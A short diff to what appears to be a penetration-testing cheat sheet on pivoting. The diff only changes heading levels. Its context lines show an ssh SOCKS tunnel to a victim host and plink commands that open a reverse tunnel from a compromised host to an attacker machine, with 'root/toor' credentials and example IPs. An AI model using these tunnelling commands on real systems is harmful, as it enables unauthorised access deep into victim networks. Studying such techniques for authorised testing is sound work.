@@ -146,7 +146,7 @@ ssh -NfD 1080 [victim user]@[victim ip]
 
 ## Plink
 
-#### Remote Tunnel
+### Remote Tunnel
 
 ```
 cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
@@ -161,7 +161,7 @@ for example, suppose you have gained access at a dual-homed host and using this 
 
 `cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 13.13.13.13:2222:10.10.10.10:22 13.13.13.13`
 
-#### Local Tunnel
+### Local Tunnel
 
 If you don't want to do an SSH remote port forwarding, but a local one instead:
 
